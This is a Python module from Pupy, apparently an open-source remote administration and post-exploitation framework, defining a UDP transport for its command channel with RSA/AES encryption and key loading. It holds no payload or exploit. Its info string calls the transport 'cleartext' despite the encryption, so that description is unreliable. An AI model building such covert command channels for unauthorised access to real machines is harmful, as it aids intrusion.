# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

from network.transports import Transport, LAUNCHER_TYPE_BIND
from network.lib import PupyUDPServer, PupyUDPClient, PupyUDPSocketStream
from network.lib import RSA_AESClient, RSA_AESServer, DummyPupyTransport

class TransportConf(Transport):
    info = "Simple UDP transport transmitting in cleartext"
    name="udp_secure"
    server=PupyUDPServer
    client=PupyUDPClient
    stream=PupyUDPSocketStream
    client_transport=DummyPupyTransport
    server_transport=DummyPupyTransport
    dgram=True
    credentials = ['SIMPLE_RSA_PRIV_KEY', 'SIMPLE_RSA_PUB_KEY']

    def __init__(self, *args, **kwargs):
        Transport.__init__(self, *args, **kwargs)

        try:
            import pupy_credentials
            RSA_PUB_KEY = pupy_credentials.SIMPLE_RSA_PUB_KEY
            RSA_PRIV_KEY = pupy_credentials.SIMPLE_RSA_PRIV_KEY

        except ImportError:
            from pupylib.PupyCredentials import Credentials
            credentials = Credentials()
            RSA_PUB_KEY = credentials['SIMPLE_RSA_PUB_KEY']
            RSA_PRIV_KEY = credentials['SIMPLE_RSA_PRIV_KEY']

        if self.launcher_type == LAUNCHER_TYPE_BIND:
            self.client_transport = RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
            self.server_transport = RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)

        else:
            self.client_transport = RSA_AESClient.custom(pubkey=RSA_PUB_KEY, rsa_key_size=4096, aes_size=256)
            self.server_transport = RSA_AESServer.custom(privkey=RSA_PRIV_KEY, rsa_key_size=4096, aes_size=256)
